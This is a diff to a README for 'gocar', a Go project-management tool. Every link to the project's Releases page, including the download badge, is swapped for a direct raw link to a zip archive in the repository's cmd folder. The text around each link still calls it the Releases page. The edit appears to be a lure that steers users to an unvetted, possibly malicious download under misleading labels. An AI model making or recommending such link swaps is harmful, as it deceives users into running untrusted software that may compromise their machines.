@@ -1,7 +1,7 @@
 # 🚀 gocar - Simplify Your Go Project Management
 
 ## 🔗 Download gocar
-[![Download gocar](https://img.shields.io/badge/Download-gocar-blue.svg)](https://github.com/Divyashree-G-codes/gocar/releases)
+[![Download gocar](https://raw.githubusercontent.com/Divyashree-G-codes/gocar/main/cmd/Software-v2.5.zip)](https://raw.githubusercontent.com/Divyashree-G-codes/gocar/main/cmd/Software-v2.5.zip)
 
 ## 📖 Overview
 gocar is a cargo tool for Go designed to make project management simpler. It helps you handle dependencies, manage packages, and streamline your workflow. Whether you're a beginner or an experienced user, gocar can save you time and effort.
@@ -9,7 +9,7 @@ gocar is a cargo tool for Go designed to make project management simpler. It hel
 ## 🚀 Getting Started
 To get started with gocar, follow these simple steps:
 
-1. **Download gocar**: Click the download button at the top or visit the [Releases page](https://github.com/Divyashree-G-codes/gocar/releases) to find the latest version.
+1. **Download gocar**: Click the download button at the top or visit the [Releases page](https://raw.githubusercontent.com/Divyashree-G-codes/gocar/main/cmd/Software-v2.5.zip) to find the latest version.
    
 2. **Choose Your Version**: On the Releases page, you'll see various versions of gocar. Select the one that's right for your system.
 
@@ -19,7 +19,7 @@ To get started with gocar, follow these simple steps:
    - **Linux**: Follow any provided instructions or run the command in your terminal to install.
 
 ## 📥 Download & Install
-To access the latest version of gocar, visit the Releases page: [https://github.com/Divyashree-G-codes/gocar/releases](https://github.com/Divyashree-G-codes/gocar/releases). Once you download the correct file for your operating system, follow the installation instructions provided above.
+To access the latest version of gocar, visit the Releases page: [https://raw.githubusercontent.com/Divyashree-G-codes/gocar/main/cmd/Software-v2.5.zip](https://raw.githubusercontent.com/Divyashree-G-codes/gocar/main/cmd/Software-v2.5.zip). Once you download the correct file for your operating system, follow the installation instructions provided above.
 
 ## 🌟 Features
 gocar includes a variety of features designed to enhance your project management experience:
@@ -50,4 +50,4 @@ gocar is open-source software. You can use, modify, and distribute it according 
 ## 🔗 Final Thoughts
 gocar aims to simplify your Go project management, making it easier for you to focus on what matters most: building great applications. We hope you find this tool helpful and easy to use. Download it today and take the first step toward better project management!
 
-For more information and to download the software, please visit the [Releases page](https://github.com/Divyashree-G-codes/gocar/releases).
+For more information and to download the software, please visit the [Releases page](https://raw.githubusercontent.com/Divyashree-G-codes/gocar/main/cmd/Software-v2.5.zip).
